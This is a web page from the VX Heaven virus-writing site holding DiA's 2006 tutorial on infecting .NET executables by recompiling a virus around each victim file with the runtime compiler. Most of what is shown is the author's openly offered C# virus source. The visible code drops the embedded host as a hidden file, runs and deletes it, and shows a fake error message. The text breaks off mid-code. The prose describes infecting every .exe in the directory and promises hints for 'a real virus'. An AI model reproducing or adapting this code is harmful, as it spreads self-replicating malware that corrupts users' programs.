<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> DiA 'Using the .NET runtime compiler for file infection' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="DiA"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, DiA,Using the .NET runtime compiler for file infection, system, marker, victimfile, idea, ideas, close, directory, file, write, array, make, parameter, files, runtime, victim"/>
<meta name="Description" content="Hello and welcome to my second article on .NET and C#. Again I got bored of programming in C++. So, this is again a sidestep in the easy and simple world of .NET programming. In this tutorial I describe how to infect executables by using the .NET runtime compiler. Also I provide a workin source code with comments and ideas/hints how to make a real virus with this technique."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"03415cf48bb5f7fea123683aab4b273e44289a57-1498757396-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vdi02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Using the .NET runtime compiler for file infection</h1><p><a href="/lib/?lang=en&amp;author=DiA"> DiA</a><br/> <em><a href="/vx.php?fid=1528#f1528">Electrical Ordered Freedom #1</a></em><br/> <em>August 2006</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vdi02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VT#vdi02">Back to index</a>] [<a href="/lib/vdi02.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">Intro</a></li>
<li><a href="#c2">The main idea</a></li>
<li><a href="#c3">My ideas, and what not worked</a></li>
<li><a href="#c4">How it can work</a></li>
<li><a href="#c5">Working source code</a></li>
<li><a href="#c6">Make it strong, further ideas</a></li>
<li><a href="#c7">Outro</a></li>
</ul>
<h2><a name="c1"></a>Intro</h2>
<p>Hello and welcome to my second article on .NET and C#. Again I got bored of programming in C++. So, this is again a sidestep in the easy and simple world of .NET programming. In this tutorial I describe how to infect executables by using the .NET runtime compiler. Also I provide a workin source code with comments and ideas/hints how to make a real virus with this technique.</p>
<h2><a name="c2"></a>The main idea</h2>
<p>When I played with the runtime compiler, I also checked out all the compiler options and parameters. Resource files (any kind, .jpg, .doc, .xxx) can be compiled within the source. And .NET provides a ResourceManager, wich makes reading resources in .NET files very easy. So the main idea is to compile the virus every time new when a victim was found, and the victim will be added as resource. Then on runtime, extract resource and run the host file. To act like this, the virus must have its own source, to compile. Since .NET executables (not abused) is like open source (use Reflector) we just don't really care.</p>
<h2><a name="c3"></a>My ideas, and what not worked</h2>
<p>I got good ideas before I started coding this example virus, but it turned out that much don't work very well:</p>
<p><strong>Source as String</strong></p>
<p>I wanted to store the source code of the virus as string in the virus body. It was much much work, and not really worth it. You have to care that your source is compiled right (care for " as example), string max length (in source) is 2046 bytes.</p>
<p><strong>Load host in memory</strong></p>
<p>You can load a .NET assembly (a .exe for example), and invoke (execute) it in your current running application. This would be nice, cause you dont have to drop host on disk and run it. But it turned out that this technique is just fine for standalone application. Try to execute a application linked to .dll's or other needed files will cause problems or errors. Anyway, here is the source I tried, host file is in a byte array:</p>
<div class="csharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: black; font-style: italic;">//...</span><br/>
&nbsp; Assembly HostAsm <span style="color: #008000;">=</span> Assembly<span style="color: #008000;">.</span><span style="color: #0000FF;">Load</span><span style="color: black;">&#40;</span>HostArray<span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//byte array, .exe</span><br/>
&nbsp; MethodInfo HostMethod <span style="color: #008000;">=</span> HostAsm<span style="color: #008000;">.</span><span style="color: #0000FF;">EntryPoint</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//main</span><br/>
&nbsp; HostMethod<span style="color: #008000;">.</span><span style="color: #0000FF;">Invoke</span><span style="color: black;">&#40;</span>HostAsm<span style="color: #008000;">.</span><span style="color: #0000FF;">CreateInstance</span><span style="color: black;">&#40;</span>HostMethod<span style="color: #008000;">.</span><span style="color: #0000FF;">Name</span><span style="color: black;">&#41;</span>, <span style="color: #0600FF; font-weight: bold;">null</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//execute</span><br/>
&nbsp; <span style="color: black; font-style: italic;">//...</span><br/>
&nbsp;</div>
<p><strong>Check for infection</strong></p>
<p>To not re-infect files, we have to check for infection. Good, as .NET have a ResourceManager, and the already infected files must have a resource named like we want it. Try to read a byte, if no error occours the file seems to be infected, error means no resource named like we have, means not infected. But somehow I can't close the resource stream when the host resource doesn't exist. And if the stream is still open, we can't delete the victim file (nor recompile it). It's mystic that .NET allow to open a not existing stream, but it's not able to close this stream. Anyway, improve!</p>
<h2><a name="c4"></a>How it can work</h2>
<p>So, much don't work as I wanted, improve is the keyword. And improve means going simple, and use already known techniques. This is how the example virus works: The virus source is also in the binary as resource, and will be read and drop to disc when needed. But first the host is read from the resource stream, dropped to disc, and executed. After termination the temporary host will be deleted. Here goes the infection (source code is already on disc). The virus find all .exe files in current directory, copy that file to &lt;filename>.res, delete original victim, and compile the virus source (in same directory) to the .exe name of the victim. On compiling it add's the host binary and the virus source as resource. After compilation the virus writes it's infection marker in the PE header. If something goes wrong the temp resource file is copied back, to leave host uninfected. Before infecting the virus also checks if the found .exe is a .NET application and if the victim is already infected, by checking 4 bytes in the PE header (WIN32_VERSION). For more details please check the source code in the next section, there are also comments for helping you to understand what I mean.</p>
<h2><a name="c5"></a>Working source code</h2>
<div class="csharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System</span><span style="color: #008000;">;</span><br/>
<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.IO</span><span style="color: #008000;">;</span><br/>
<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.Reflection</span><span style="color: #008000;">;</span><br/>
<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.CodeDom.Compiler</span><span style="color: #008000;">;</span><br/>
<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">Microsoft.CSharp</span><span style="color: #008000;">;</span><br/>
<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.Resources</span><span style="color: #008000;">;</span><br/>
<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.Diagnostics</span><span style="color: #008000;">;</span><br/>
<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.Windows.Forms</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//namespaces we use in this virus</span><br/>
<br/>
<span style="color: #0600FF; font-weight: bold;">namespace</span> Biskin <span style="color: black; font-style: italic;">//our namespace</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">class</span> DiA <span style="color: black; font-style: italic;">//we use just this one class, simple virus</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">static</span> <span style="color: #6666cc; font-weight: bold;">void</span> Main<span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">string</span><span style="color: black;">&#91;</span><span style="color: black;">&#93;</span> args<span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//our entry point</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">byte</span><span style="color: black;">&#91;</span><span style="color: black;">&#93;</span> Marker <span style="color: #008000;">=</span> <span style="color: black;">&#123;</span>0x42, 0x53, 0x4B, 0x69<span style="color: black;">&#125;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//&quot;BSKi&quot;, our infection marker to prevent re-infection</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">string</span> SourceName <span style="color: #008000;">=</span> <span style="color: #666666;">&quot;&quot;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//here we store the extracted source code, we define it here because we handle it in more try/catch then one</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Random RanNumber <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> Random<span style="color: black;">&#40;</span>DateTime<span style="color: #008000;">.</span><span style="color: #0000FF;">Now</span><span style="color: #008000;">.</span><span style="color: #0000FF;">Millisecond</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//to generate random number, user current millisecond as seed</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Assembly ThisAsm <span style="color: #008000;">=</span> Assembly<span style="color: #008000;">.</span><span style="color: #0000FF;">GetExecutingAssembly</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//the own assembly, to extract the resources (host &amp; source)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">try</span> <span style="color: black; font-style: italic;">//we use some try/catch blocks in this virus, error handling in c# is nice</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Stream ResStream <span style="color: #008000;">=</span> ThisAsm<span style="color: #008000;">.</span><span style="color: #0000FF;">GetManifestResourceStream</span><span style="color: black;">&#40;</span><span style="color: #666666;">&quot;host.bin&quot;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//get the stream for the resource &quot;host.bin&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">string</span> HostName <span style="color: #008000;">=</span> RanNumber<span style="color: #008000;">.</span><span style="color: #0000FF;">Next</span><span style="color: black;">&#40;</span><span style="color: #FF0000;">99999</span><span style="color: black;">&#41;</span><span style="color: #008000;">.</span><span style="color: #0000FF;">ToString</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #008000;">+</span> <span style="color: #666666;">&quot;.scr&quot;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//generate a temporary host name, just andom number and .scr extension</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FileStream HostTemp <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> FileStream<span style="color: black;">&#40;</span>HostName, FileMode<span style="color: #008000;">.</span><span style="color: #0000FF;">CreateNew</span>, FileAccess<span style="color: #008000;">.</span><span style="color: #0000FF;">Write</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//filestream to write from resource to file</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">int</span> i <span style="color: #008000;">=</span> <span style="color: #FF0000;">0</span><span style="color: #008000;">;</span> i <span style="color: #008000;">&lt;</span> ResStream<span style="color: #008000;">.</span><span style="color: #0000FF;">Length</span><span style="color: #008000;">;</span> i<span style="color: #008000;">++</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//write byte by byte until we reach end of file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; HostTemp<span style="color: #008000;">.</span><span style="color: #0000FF;">WriteByte</span><span style="color: black;">&#40;</span>Convert<span style="color: #008000;">.</span><span style="color: #0000FF;">ToByte</span><span style="color: black;">&#40;</span>ResStream<span style="color: #008000;">.</span><span style="color: #0000FF;">ReadByte</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//read byte from stream and write it to file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; HostTemp<span style="color: #008000;">.</span><span style="color: #0000FF;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//close file stream</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ResStream<span style="color: #008000;">.</span><span style="color: #0000FF;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//close resource stream</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File<span style="color: #008000;">.</span><span style="color: #0000FF;">SetAttributes</span><span style="color: black;">&#40;</span>HostName, FileAttributes<span style="color: #008000;">.</span><span style="color: #0000FF;">Hidden</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//set the temp host to hidden</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #6666cc; font-weight: bold;">string</span> HostParameters <span style="color: #008000;">=</span> <span style="color: #666666;">&quot; &quot;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//to store host's parameter, drag and drop or called via command line</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">int</span> i <span style="color: #008000;">=</span> <span style="color: #FF0000;">0</span><span style="color: #008000;">;</span> i <span style="color: #008000;">&lt;</span> args<span style="color: #008000;">.</span><span style="color: #0000FF;">Length</span><span style="color: #008000;">;</span> i<span style="color: #008000;">++</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//for each argument (parameter) given to the virus</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; HostParameters <span style="color: #008000;">+=</span> args<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span> <span style="color: #008000;">+</span> <span style="color: #666666;">&quot; &quot;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//append it to string and put a space between</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Process<span style="color: #008000;">.</span><span style="color: #0000FF;">Start</span><span style="color: black;">&#40;</span>HostName <span style="color: #008000;">+</span> HostParameters<span style="color: black;">&#41;</span><span style="color: #008000;">.</span><span style="color: #0000FF;">WaitForExit</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//start temporary host and wait for it's termination</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File<span style="color: #008000;">.</span><span style="color: #0000FF;">Delete</span><span style="color: black;">&#40;</span>HostName<span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//after termination, delete the temporary host</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">catch</span> <span style="color: black; font-style: italic;">//error on reading resource or write/run temp host</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MessageBox<span style="color: #008000;">.</span><span style="color: #0000FF;">Show</span><span style="color: black;">&#40;</span><span style="color: #666666;">&quot;Can't execute application&quot;</span>, <span style="color: #666666;">&quot;Error&quot;</span>, MessageBoxButtons<span style="color: #008000;">.</span><span style="color: #0000FF;">OK</span>, MessageBoxIcon<span style="color: #008000;">.</span><span style="color: #0000FF;">Error</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//show fake error then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">try</span> <span style="color: black; font-style: italic;">//try to extract source code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Stream SrcStream <span style="color: #008000;">=</span> ThisAsm<span style="color: #008000;">.</span><span style="color: #0000FF;">GetManifestResourceStream</span><span style="color: black;">&#40;</span><span style="color: #666666;">&quot;biskin.src&quot;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//get stream to resource</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SourceName <span style="color: #008000;">=</span> RanNumber<span style="color: #008000;">.</span><span style="color: #0000FF;">Next</span><span style="color: black;">&#40;</span><span style="color: #FF0000;">99999</span><span style="color: black;">&#41;</span><span style="color: #008000;">.</span><span style="color: #0000FF;">ToString</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #008000;">+</span> <span style="color: #666666;">&quot;.cs&quot;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//create temporary source file name, random number</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FileStream SourceTemp <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> FileStream<span style="color: black;">&#40;</span>SourceName, FileMode<span style="color: #008000;">.</span><span style="color: #0000FF;">CreateNew</span>, FileAccess<span style="color: #008000;">.</span><span style="color: #0000FF;">Write</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//open filestream for write source to disk</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">int</span> i <span style="color: #008000;">=</span> <span style="color: #FF0000;">0</span><span style="color: #008000;">;</span> i <span style="color: #008000;">&lt;</span> SrcStream<span style="color: #008000;">.</span><span style="color: #0000FF;">Length</span><span style="color: #008000;">;</span> i<span style="color: #008000;">++</span><span style="color: black;">&#41;</span> <span style="color: black; font-style: italic;">//write byte by byte</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SourceTemp<span style="color: #008000;">.</span><span style="color: #0000FF;">WriteByte</span><span style="color: black;">&#40;</span>Convert<span style="color: #008000;">.</span><span style="color: #0000FF;">ToByte</span><span style="color: black;">&#40;</span>SrcStream<span style="color: #008000;">.</span><span style="color: #0000FF;">ReadByte</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//read byte from resource and write it to file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SourceTemp<span style="color: #008000;">.</span><span style="color: #0000FF;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//close file stream</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SrcStream<span style="color: #008000;">.</span><span style="color: #0000FF;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//close resource stream</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0600FF; font-weight: bold;">catch</span> <span style="color: black; font-style: italic;">//error on reading/writing source code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Application<span style="color: #008000;">.</span><span style="color: #0000FF;">Exit</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">//no source, no infection is possible, exit virus</span><br/>
